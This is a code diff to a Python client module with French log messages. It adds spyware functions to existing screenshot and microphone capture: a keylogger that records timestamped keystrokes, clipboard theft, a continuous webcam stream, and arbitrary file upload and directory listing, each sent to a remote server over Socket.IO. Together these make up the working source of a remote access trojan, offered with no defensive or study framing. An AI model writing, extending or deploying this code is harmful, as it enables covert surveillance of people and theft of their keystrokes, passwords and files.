@@ -1,13 +1,18 @@
 import base64
 import io
+import os
+import time
 import wave
 
+import cv2
+import keyboard
 import pyaudio
 import pyautogui
+import pyperclip
 from PIL import Image
 
 
-def take_and_send_screenshot(sio):
+def take_and_send_screenshot(sio, user_id):
     try:
         screenshot = pyautogui.screenshot()
         screenshot_bytes_io = io.BytesIO()
@@ -15,12 +20,11 @@ def take_and_send_screenshot(sio):
         screenshot_bytes_io.seek(0)
         resized_screenshot = resize_image(screenshot_bytes_io)
         screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
-        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
+        sio.emit('screenshot_response', {'screenshot': screenshot_encoded, 'user_id': user_id})
         print("Capture d'écran envoyée")
     except Exception as e:
         print(f"Échec de la capture d'écran: {e}")
         pass
-
 
 def resize_image(image_bytes_io, base_width=1300):
     img = Image.open(image_bytes_io)
@@ -31,8 +35,7 @@ def resize_image(image_bytes_io, base_width=1300):
     img.save(img_byte_arr, format='PNG')
     return img_byte_arr
 
-
-def record_and_send_audio(duration=10, sio=None):
+def record_and_send_audio(duration=10, sio=None, user_id=None):
     try:
         audio = pyaudio.PyAudio()
         stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
@@ -50,12 +53,11 @@ def record_and_send_audio(duration=10, sio=None):
 
         audio_io.seek(0)
         audio_encoded = base64.b64encode(audio_io.read()).decode()
-        sio.emit('audio_response', {'audio': audio_encoded})
+        sio.emit('audio_response', {'audio': audio_encoded, 'user_id': user_id})
         print("Audio envoyé")
     except Exception as e:
         print(f"Échec de l'enregistrement audio: {e}")
         pass
-
 
 def save_wave_file(file_io, audio_data):
     with wave.open(file_io, 'wb') as wave_file:
@@ -63,3 +65,98 @@ def save_wave_file(file_io, audio_data):
         wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
         wave_file.setframerate(44100)
         wave_file.writeframes(audio_data)
+
+def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
+    try:
+        print("Enregistrement du keylogger en cours...")
+        keyboard.start_recording()
+        time.sleep(duration)
+        keyboard_events = keyboard.stop_recording()
+        keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
+        keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
+        sio.emit('keyboard_response', {'keyboard_log': keyboard_log, 'user_id': user_id})
+        print("Keylogger envoyé")
+    except Exception as e:
+        print(f"Échec de l'enregistrement du keylogger: {e}")
+        pass
+
+def get_clipboard_content(sio=None, user_id=None):
+    try:
+        print("Récupération du clipboard...")
+        clipboard_content = pyperclip.paste()
+        if clipboard_content and sio:
+            sio.emit('clipboard_response', {'clipboard_content': clipboard_content, 'user_id': user_id})
+            print("Contenu du clipboard envoyé au serveur.")
+        else:
+            print("Aucun contenu trouvé dans le clipboard ou connexion au serveur Socket.IO manquante.")
+    except Exception as e:
+        print(f"Échec de la récupération du clipboard: {e}")
+
+
+def gen_frames(sio):
+    try:
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
+        if not camera.isOpened():
+            raise ValueError("Failed to open webcam")
+
+        while True:
+            success, frame = camera.read()
+            if not success:
+                print("Failed to read frame from webcam")
+                break
+            else:
+                ret, buffer = cv2.imencode('.jpg', frame)
+                if not ret:
+                    print("Failed to encode frame")
+                    continue
+                frame_bytes = base64.b64encode(buffer)
+                sio.emit('webcam_response', {'data': frame_bytes.decode()})
+
+    except Exception as e:
+        print(f"Failed to initialize or read from webcam: {e}")
+    finally:
+        if 'camera' in locals() and camera.isOpened():
+            camera.release()
+        cv2.destroyAllWindows()
+
+def download_file(file_path, sio, user_id):
+    try:
+        if os.path.exists(file_path):
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+                file_encoded = base64.b64encode(file_data).decode()
+                sio.emit('file_response',
+                         {'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
+                print("Fichier envoyé")
+        else:
+            print("Fichier introuvable")
+    except Exception as e:
+        print(f"Échec de l'envoi du fichier: {e}")
+
+def list_dir(dir_path, sio):
+    files_and_dirs = []
+    try:
+        if os.path.exists(dir_path) and os.path.isdir(dir_path):
+            for file_name in os.listdir(dir_path):
+                file_path = os.path.join(dir_path, file_name)
+                if os.path.isfile(file_path):
+                    size = os.path.getsize(file_path)
+                    if size < 1024:
+                        size = f"{size} B"
+                    elif size < 1024 ** 2:
+                        size = f"{size / 1024:.2f} KB"
+                    elif size < 1024 ** 3:
+                        size = f"{size / 1024 ** 2:.2f} MB"
+                    else:
+                        size = f"{size / 1024 ** 3:.2f} GB"
+
+                    files_and_dirs.append({'name': file_name, 'type': 'file'})
+                elif os.path.isdir(file_path):
+                    files_and_dirs.append({'name': file_name, 'type': 'dir'})
+            files_and_dirs.append({'path': dir_path})
+            sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
+            print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
+        else:
+            print("Chemin du répertoire invalide ou inexistant")
+    except Exception as e:
+        print(f"Échec de la liste des fichiers et dossiers: {e}")
